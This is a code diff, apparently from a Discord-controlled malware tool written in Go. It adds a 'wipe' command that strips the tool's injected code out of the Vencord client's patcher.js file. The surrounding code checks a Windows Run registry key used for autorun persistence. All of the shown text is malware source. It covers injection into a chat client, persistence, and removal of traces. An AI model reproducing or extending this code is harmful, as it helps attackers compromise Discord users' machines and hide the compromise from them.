@@ -6,6 +6,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strings"
 	"syscall"
 	"time"
 
@@ -34,12 +35,35 @@ func (*WipeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args [
 	}
 
 	if !config.Debugging && !kill {
-		checked := false
+		vencord := filepath.Join(os.Getenv("APPDATA"), "Vencord\\dist\\patcher.js")
+		data, err := os.ReadFile(vencord)
+		if err == nil {
+			dataStr := string(data)
+			lines := strings.Split(dataStr, "\n")
 
-		_, err := utils.GetRegistryVal(
+			found := false
+			var newLines []string
+
+			for _, line := range lines {
+				if !found && strings.Contains(line, config.Identifier) {
+					found = true
+					continue
+				}
+
+				if !found {
+					newLines = append(newLines, line)
+				}
+			}
+
+			os.WriteFile(vencord, []byte(strings.Join(newLines, "\n")), 0644)
+		}
+
+		_, err = utils.GetRegistryVal(
 			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
 			config.HypothermiaName,
 		)
+
+		checked := false
 
 		if err != nil {
 			checked = true
